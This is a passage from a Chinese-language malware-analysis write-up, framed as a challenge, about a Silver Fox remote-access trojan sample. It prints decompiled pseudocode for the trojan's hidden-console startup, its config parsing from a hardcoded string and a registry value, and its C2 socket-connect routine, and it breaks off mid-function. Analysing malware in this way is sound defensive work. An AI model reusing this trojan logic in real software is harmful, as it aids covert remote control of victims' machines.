{"posts":[{"title":"","text":"银狐木马样本深度分析与后门域名溯源 title: 银狐木马样本深度分析与后门域名溯源 date: 2025-12-10 由于制做C2工具的黑客留下了后门，所以这个木马是有后门的，你能找到它的后门吗 提示端口和IP信息主要在sub_140003390函数和sub_140008750函数 WriteUpwmain函数 123456789101112131415161718__int64 wmain(){ HWND hWnd; // rax DWORD idThread; // eax SetUnhandledExceptionFilter(TopLevelExceptionFilter); hWnd = GetConsoleWindow(); ShowWindow(hWnd, 0); idThread = GetCurrentThreadId(); PostThreadMessageA(idThread, 0, 0, 0); GetInputState(); sub_140008750(); hObject = CreateThread(0, 0, sub_14000A440, 0, 0, 0); WaitForSingleObject(hObject, 0xFFFFFFFF); CloseHandle(hObject); Sleep(0x12Cu); return 0;} 先看sub_140008750函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739#sub_140008750函数int sub_140008750(){ _UNKNOWN **v0; // rax __int64 v1; // rbx int v2; // eax int v3; // r9d __int64 v4; // rdx int v5; // r10d __int64 i; // r8 int v7; // ecx __int64 v8; // rbx int v9; // eax int v10; // r9d __int64 v11; // rdx int v12; // r10d __int64 j; // r8 int v14; // ecx __int64 v15; // rbx int v16; // eax int v17; // r9d __int64 v18; // rdx int v19; // r10d __int64 k; // r8 int v21; // ecx __int64 v22; // rbx int v23; // eax int v24; // r9d __int64 v25; // rdx int v26; // r10d __int64 m; // r8 int v28; // ecx __int64 v29; // rbx int v30; // eax int v31; // r9d __int64 v32; // rdx int v33; // r10d __int64 n; // r8 int v35; // ecx __int64 v36; // rbx int v37; // eax int v38; // r9d __int64 v39; // rdx int v40; // r10d __int64 ii; // r8 int v42; // ecx __int64 v43; // rbx int v44; // eax int v45; // r9d __int64 v46; // rdx int v47; // r10d __int64 jj; // r8 int v49; // ecx __int64 v50; // rbx int v51; // eax int v52; // r9d __int64 v53; // rdx int v54; // r10d __int64 kk; // r8 int v56; // ecx __int64 v57; // rbx int v58; // eax int v59; // r9d __int64 v60; // rdx int v61; // r10d __int64 mm; // r8 int v63; // ecx __int64 v64; // rbx int v65; // eax int v66; // r9d __int64 v67; // rdx int v68; // r10d __int64 nn; // r8 int v70; // ecx __int64 v71; // rbx int v72; // eax int v73; // r9d __int64 v74; // rdx int v75; // r10d __int64 i1; // r8 int v77; // ecx __int64 v78; // rbx int v79; // eax int v80; // r9d __int64 v81; // rdx int v82; // r10d __int64 i2; // r8 __int64 v84; // rbx int v85; // eax int v86; // r9d __int64 v87; // rdx int v88; // r10d __int64 i3; // r8 int v90; // ecx int v91; // ecx __int64 v92; // rbx int v93; // r9d __int64 v94; // rdx __int64 v95; // rsi int v96; // r10d __int64 v97; // r8 int v98; // ecx _UNKNOWN *retaddr; // [rsp+68h] [rbp+0h] BYREF DWORD cbData; // [rsp+70h] [rbp+8h] BYREF DWORD Type; // [rsp+78h] [rbp+10h] BYREF HKEY hKey; // [rsp+80h] [rbp+18h] BYREF v0 = &amp;retaddr; if ( !byte_140060708 ) { byte_140060708 = 1; wcsrev(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; memset(&amp;Src, 0, 0x12A0u); sub_140008620(L&quot;p1:&quot;, &amp;Source); sub_140008620(L&quot;o1:&quot;, &amp;Source__1); v1 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v2 = lstrlenW(L&quot;t1:&quot;); v3 = 0; v4 = 0; if ( (int)v1 &gt; 0 ) { while ( 1 ) { v5 = 0; for ( i = 0; i &lt; v2; ++v5 ) { if ( a0Db0Lk0Hs0Ld0L[v4 + i] != aT1[i] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i; } if ( v5 == v2 ) { v4 += v2; v3 += v2; if ( v4 &lt; v1 ) break; }LABEL_10: ++v4; ++v3; if ( v4 &gt;= v1 ) goto LABEL_15; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v4] != 124 ) { ++v4; ++v3; if ( v4 &gt;= v1 ) goto LABEL_10; } v7 = dword_14005F6A8; if ( a0Db0Lk0Hs0Ld0L[v3 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v7 = 1; dword_14005F6A8 = v7; }LABEL_15: sub_140008620(L&quot;p2:&quot;, &amp;Source_); sub_140008620(L&quot;o2:&quot;, &amp;Source__0); v8 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v9 = lstrlenW(L&quot;t2:&quot;); v10 = 0; v11 = 0; if ( (int)v8 &gt; 0 ) { while ( 1 ) { v12 = 0; for ( j = 0; j &lt; v9; ++v12 ) { if ( a0Db0Lk0Hs0Ld0L[v11 + j] != aT2[j] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++j; } if ( v12 == v9 ) { v11 += v9; v10 += v9; if ( v11 &lt; v8 ) break; }LABEL_23: ++v11; ++v10; if ( v11 &gt;= v8 ) goto LABEL_28; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v11] != 124 ) { ++v11; ++v10; if ( v11 &gt;= v8 ) goto LABEL_23; } v14 = dword_14005F8E8; if ( a0Db0Lk0Hs0Ld0L[v10 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v14 = 1; dword_14005F8E8 = v14; }LABEL_28: sub_140008620(L&quot;p3:&quot;, &amp;Source__2); sub_140008620(L&quot;o3:&quot;, &amp;Source__3); v15 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v16 = lstrlenW(L&quot;t3:&quot;); v17 = 0; v18 = 0; if ( (int)v15 &gt; 0 ) { while ( 1 ) { v19 = 0; for ( k = 0; k &lt; v16; ++v19 ) { if ( a0Db0Lk0Hs0Ld0L[v18 + k] != aT3[k] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++k; } if ( v19 == v16 ) { v18 += v16; v17 += v16; if ( v18 &lt; v15 ) break; }LABEL_36: ++v18; ++v17; if ( v18 &gt;= v15 ) goto LABEL_41; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v18] != 124 ) { ++v18; ++v17; if ( v18 &gt;= v15 ) goto LABEL_36; } v21 = dword_14005FB28; if ( a0Db0Lk0Hs0Ld0L[v17 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v21 = 1; dword_14005FB28 = v21; }LABEL_41: sub_140008620(L&quot;dd:&quot;, &amp;Destination__0); sub_140008620(L&quot;cl:&quot;, &amp;Destination__1); sub_140008620(L&quot;fz:&quot;, &amp;unk_14005FBA4); sub_140008620(L&quot;bb:&quot;, &amp;unk_14005FC08); sub_140008620(L&quot;bz:&quot;, &amp;unk_14005FC6C); v22 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v23 = lstrlenW(L&quot;jp:&quot;); v24 = 0; v25 = 0; if ( (int)v22 &gt; 0 ) { while ( 1 ) { v26 = 0; for ( m = 0; m &lt; v23; ++v26 ) { if ( a0Db0Lk0Hs0Ld0L[v25 + m] != aJp[m] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++m; } if ( v26 == v23 ) { v25 += v23; v24 += v23; if ( v25 &lt; v22 ) break; }LABEL_49: ++v25; ++v24; if ( v25 &gt;= v22 ) goto LABEL_54; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v25] != 124 ) { ++v25; ++v24; if ( v25 &gt;= v22 ) goto LABEL_49; } v28 = dword_14005FCD0; if ( a0Db0Lk0Hs0Ld0L[v24 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v28 = 1; dword_14005FCD0 = v28; }LABEL_54: v29 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v30 = lstrlenW(L&quot;sx:&quot;); v31 = 0; v32 = 0; if ( (int)v29 &gt; 0 ) { while ( 1 ) { v33 = 0; for ( n = 0; n &lt; v30; ++v33 ) { if ( a0Db0Lk0Hs0Ld0L[v32 + n] != aSx[n] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++n; } if ( v33 == v30 ) { v32 += v30; v31 += v30; if ( v32 &lt; v29 ) break; }LABEL_62: ++v32; ++v31; if ( v32 &gt;= v29 ) goto LABEL_67; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v32] != 124 ) { ++v32; ++v31; if ( v32 &gt;= v29 ) goto LABEL_62; } v35 = dword_14005FCD4; if ( a0Db0Lk0Hs0Ld0L[v31 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v35 = 1; dword_14005FCD4 = v35; }LABEL_67: v36 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v37 = lstrlenW(L&quot;bh:&quot;); v38 = 0; v39 = 0; if ( (int)v36 &gt; 0 ) { while ( 1 ) { v40 = 0; for ( ii = 0; ii &lt; v37; ++v40 ) { if ( a0Db0Lk0Hs0Ld0L[v39 + ii] != aBh[ii] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++ii; } if ( v40 == v37 ) { v39 += v37; v38 += v37; if ( v39 &lt; v36 ) break; }LABEL_75: ++v39; ++v38; if ( v39 &gt;= v36 ) goto LABEL_80; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v39] != 124 ) { ++v39; ++v38; if ( v39 &gt;= v36 ) goto LABEL_75; } v42 = dword_14005FCD8; if ( a0Db0Lk0Hs0Ld0L[v38 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v42 = 1; dword_14005FCD8 = v42; }LABEL_80: v43 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v44 = lstrlenW(L&quot;ll:&quot;); v45 = 0; v46 = 0; if ( (int)v43 &gt; 0 ) { while ( 1 ) { v47 = 0; for ( jj = 0; jj &lt; v44; ++v47 ) { if ( a0Db0Lk0Hs0Ld0L[v46 + jj] != aLl[jj] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++jj; } if ( v47 == v44 ) { v46 += v44; v45 += v44; if ( v46 &lt; v43 ) break; }LABEL_88: ++v46; ++v45; if ( v46 &gt;= v43 ) goto LABEL_93; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v46] != 124 ) { ++v46; ++v45; if ( v46 &gt;= v43 ) goto LABEL_88; } v49 = dword_14005FCDC; if ( a0Db0Lk0Hs0Ld0L[v45 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v49 = 1; dword_14005FCDC = v49; }LABEL_93: v50 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v51 = lstrlenW(L&quot;dl:&quot;); v52 = 0; v53 = 0; if ( (int)v50 &gt; 0 ) { while ( 1 ) { v54 = 0; for ( kk = 0; kk &lt; v51; ++v54 ) { if ( a0Db0Lk0Hs0Ld0L[v53 + kk] != aDl[kk] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++kk; } if ( v54 == v51 ) { v53 += v51; v52 += v51; if ( v53 &lt; v50 ) break; }LABEL_101: ++v53; ++v52; if ( v53 &gt;= v50 ) goto LABEL_106; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v53] != 124 ) { ++v53; ++v52; if ( v53 &gt;= v50 ) goto LABEL_101; } v56 = dword_14005FCE0; if ( a0Db0Lk0Hs0Ld0L[v52 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v56 = 1; dword_14005FCE0 = v56; }LABEL_106: v57 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v58 = lstrlenW(L&quot;sh:&quot;); v59 = 0; v60 = 0; if ( (int)v57 &gt; 0 ) { while ( 1 ) { v61 = 0; for ( mm = 0; mm &lt; v58; ++v61 ) { if ( a0Db0Lk0Hs0Ld0L[v60 + mm] != aSh[mm] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++mm; } if ( v61 == v58 ) { v60 += v58; v59 += v58; if ( v60 &lt; v57 ) break; }LABEL_114: ++v60; ++v59; if ( v60 &gt;= v57 ) goto LABEL_119; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v60] != 124 ) { ++v60; ++v59; if ( v60 &gt;= v57 ) goto LABEL_114; } v63 = dword_14005FCE4; if ( a0Db0Lk0Hs0Ld0L[v59 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v63 = 1; dword_14005FCE4 = v63; }LABEL_119: v64 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v65 = lstrlenW(L&quot;kl:&quot;); v66 = 0; v67 = 0; if ( (int)v64 &gt; 0 ) { while ( 1 ) { v68 = 0; for ( nn = 0; nn &lt; v65; ++v68 ) { if ( a0Db0Lk0Hs0Ld0L[v67 + nn] != aKl[nn] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++nn; } if ( v68 == v65 ) { v67 += v65; v66 += v65; if ( v67 &lt; v64 ) break; }LABEL_127: ++v67; ++v66; if ( v67 &gt;= v64 ) goto LABEL_132; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v67] != 124 ) { ++v67; ++v66; if ( v67 &gt;= v64 ) goto LABEL_127; } v70 = dword_14005FCE8; if ( a0Db0Lk0Hs0Ld0L[v66 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v70 = 1; dword_14005FCE8 = v70; }LABEL_132: v71 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v72 = lstrlenW(L&quot;bd:&quot;); v73 = 0; v74 = 0; if ( (int)v71 &gt; 0 ) { while ( 1 ) { v75 = 0; for ( i1 = 0; i1 &lt; v72; ++v75 ) { if ( a0Db0Lk0Hs0Ld0L[v74 + i1] != aBd[i1] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i1; } if ( v75 == v72 ) { v74 += v72; v73 += v72; if ( v74 &lt; v71 ) break; }LABEL_140: ++v74; ++v73; if ( v74 &gt;= v71 ) goto LABEL_145; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v74] != 124 ) { ++v74; ++v73; if ( v74 &gt;= v71 ) goto LABEL_140; } v77 = dword_14005FCEC; if ( a0Db0Lk0Hs0Ld0L[v73 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v77 = 1; dword_14005FCEC = v77; }LABEL_145: Type = 3; cbData = 0; LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey); if ( !(_DWORD)v0 ) LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData); if ( cbData &gt; 0xA ) { memset(a0Db0Lk0Hs0Ld0L, 0, 0x7D0u); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; sub_140008620(L&quot;p1:&quot;, &amp;Source); sub_140008620(L&quot;o1:&quot;, &amp;Source__1); v78 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v79 = lstrlenW(L&quot;t1:&quot;); v80 = 0; v81 = 0; if ( (int)v78 &gt; 0 ) { while ( 1 ) { v82 = 0; for ( i2 = 0; i2 &lt; v79; ++v82 ) { if ( a0Db0Lk0Hs0Ld0L[v81 + i2] != aT1[i2] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i2; } if ( v82 == v79 ) { v81 += v79; v80 += v79; if ( v81 &lt; v78 ) break; }LABEL_156: ++v81; ++v80; if ( v81 &gt;= v78 ) goto LABEL_157; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v81] != 124 ) { ++v81; ++v80; if ( v81 &gt;= v78 ) goto LABEL_156; } v90 = dword_14005F6A8; if ( a0Db0Lk0Hs0Ld0L[v80 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v90 = 1; dword_14005F6A8 = v90; }LABEL_157: sub_140008620(L&quot;p2:&quot;, &amp;Source_); sub_140008620(L&quot;o2:&quot;, &amp;Source__0); v84 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v85 = lstrlenW(L&quot;t2:&quot;); v86 = 0; v87 = 0; if ( (int)v84 &gt; 0 ) { while ( 1 ) { v88 = 0; for ( i3 = 0; i3 &lt; v85; ++v88 ) { if ( a0Db0Lk0Hs0Ld0L[v87 + i3] != aT2[i3] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i3; } if ( v88 == v85 ) { v87 += v85; v86 += v85; if ( v87 &lt; v84 ) break; }LABEL_165: ++v87; ++v86; if ( v87 &gt;= v84 ) goto LABEL_173; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v87] != 124 ) { ++v87; ++v86; if ( v87 &gt;= v84 ) goto LABEL_165; } v91 = dword_14005F8E8; if ( a0Db0Lk0Hs0Ld0L[v86 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v91 = 1; dword_14005F8E8 = v91; }LABEL_173: sub_140008620(L&quot;p3:&quot;, &amp;Source__2); sub_140008620(L&quot;o3:&quot;, &amp;Source__3); v92 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; LODWORD(v0) = lstrlenW(L&quot;t3:&quot;); v93 = 0; v94 = 0; v95 = (int)v0; if ( (int)v92 &gt; 0 ) { while ( 1 ) { v96 = 0; v97 = 0; if ( (int)v95 &gt; 0 ) { do { LODWORD(v0) = aT3[v97]; if ( a0Db0Lk0Hs0Ld0L[v94 + v97] != (_WORD)v0 )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++v97; ++v96; } while ( v97 &lt; v95 ); } if ( v96 == (_DWORD)v95 ) { v94 += v95; v93 += v95; if ( v94 &lt; v92 ) break; }LABEL_181: ++v94; ++v93; if ( v94 &gt;= v92 ) return (int)v0; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v94] != 124 ) { ++v94; ++v93; if ( v94 &gt;= v92 ) goto LABEL_181; } v98 = dword_14005FB28; LODWORD(v0) = v93; if ( a0Db0Lk0Hs0Ld0L[v93 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v98 = 1; dword_14005FB28 = v98; } } } return (int)v0;} 1.打开注册表键 (Open Key)这一行尝试打开 HKEY_CURRENT_USER\\Console 键： 1LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey); 2.第一次查询值 (Query Value - Get Size)如果打开成功，这一行查询 IpDate 值的数据大小 (cbData)，但不读取数据： 12if ( !(_DWORD)v0 ) LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData); 3.第二次查询值 (Query Value - Read Data) 如果第一次查询显示数据大小大于 0xA，则进入这段代码，这一行实际读取了 IpDate 的数据 到字符串 a0Db0Lk0Hs0Ld0L 中： 1RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; 注册表确实有东西但是我现在也不知道这个是干啥用的解码后就只有这个Ipdatetime(9-27-1-25-18) 这个函数 sub_140008750 是 木马的配置解析初始化函数，核心作用是：从「内置硬编码字符串」或「Windows 注册表」中读取配置信息，解析后设置一系列功能开关（全局变量），仅在程序启动时执行一次（通过标志位控制）黑客植入的恶意程序中「读取控制配置」的模块，解析是否启用远控、数据上传、端口转发等功能的开关 上面图片”|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|”这里可以得到5202是混淆后的时间就是2025年11月9日 查看sub_140003390函数的反编译结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889char __fastcall cyber(char *ArgList, LPCWCH lpWideCharStr, u_short hostshort){ // ArgList: 指向一个结构体的指针，用于存储连接状态和句柄。 // lpWideCharStr: 指向宽字符字符串 (Unicode)，包含目标 HOSTNAME（主机名）。 // hostshort: 目标 PORT（端口号），为主机字节序。 SOCKET v6; // 用于存储新的套接字句柄 // ... 其他局部变量 // --- 状态初始化和重置 --- ResetEvent(*((HANDLE *)ArgList + 1)); // 重置 ArgList 结构体中的一个同步事件句柄 _InterlockedExchange((volatile __int32 *)ArgList + 8, 0); // 原子地设置 ArgList 中偏移量 +8 处的标志为 0 (例如：连接状态为“正在连接”) *((_DWORD *)ArgList + 7) = timeGetTime(); // 记录当前时间 (偏移量 +7) // ... ArgList 结构体的其他初始化和设置 // --- 1. 创建套接字 (Socket) --- v6 = socket(2, 1, 6); // 创建新的套接字：AF_INET (2, IPv4), SOCK_STREAM (1, TCP流), IPPROTO_TCP (6) -&gt; TCP/IPv4 *((_QWORD *)ArgList + 22) = v6; // 将新的套接字句柄存储在 ArgList 结构体的偏移量 +22 处 if ( v6 == -1 ) // 检查套接字创建是否失败 return 0; // --- 2. 转换主机名 (宽字符到多字节) --- cchWideChar = lstrlenW(lpWideCharStr); // 获取宽字符主机名字符串的长度 // 确定多字节字符串所需的缓冲区大小 cbMultiByte_1 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, 0, 0, 0, 0); cbMultiByte = cbMultiByte_1; lpMultiByteStr = (CHAR *)operator new(cbMultiByte_1 + 1); // 分配内存用于多字节字符串 (+1 用于空终止符) cchWideChar_1 = lstrlenW(lpWideCharStr); // 执行实际的转换：从宽字符到多字节 WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar_1, lpMultiByteStr, cbMultiByte, 0, 0); lpMultiByteStr[cbMultiByte] = 0; // 空终止多字节字符串 // --- 3. 解析主机名到 IP 地址 (DNS Lookup) --- hostbyname = gethostbyname(lpMultiByteStr); // 执行 DNS 查询，将主机名解析为 IP 地址 j_free(lpMultiByteStr); // 释放分配的多字节字符串缓冲区 if ( !hostbyname ) // 检查 DNS 解析是否失败 return 0; // --- 4. 准备目标地址结构体 (sockaddr_in) --- name.sa_family = 2; // 设置地址族为 AF_INET (IPv4) // 设置端口号：将 hostshort (主机字节序) 转换为网络字节序 *(_WORD *)name.sa_data = htons(hostshort); s = *((_QWORD *)ArgList + 22); // 获取套接字句柄 // 设置 IP 地址：获取 h_addr_list 指针数组中的第一个地址 *(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; // --- 5. 建立连接 (TCP Handshake) --- if ( connect(s, &amp;name, 16) == -1 ) // 尝试建立 TCP 连接 return 0; // --- 6. 配置套接字选项 (setsockopt) --- // 设置 SO_RCVBUF (接收缓冲区大小, 4097) 为 0x40000 (256 KB) s_1 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval = 0x40000; setsockopt(s_1, 0xFFFF, 4097, optval, 4); // 0xFFFF 是 SOL_SOCKET (套接字级别) // 设置 SO_SNDBUF (发送缓冲区大小, 4098) 为 0x40000 (256 KB) s_2 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval = 0x40000; setsockopt(s_2, 0xFFFF, 4098, optval, 4); // 设置 SO_SNDTIMEO (发送超时, 4102) 为 30000 毫秒 (30 秒) s_3 = *((_QWORD *)ArgList + 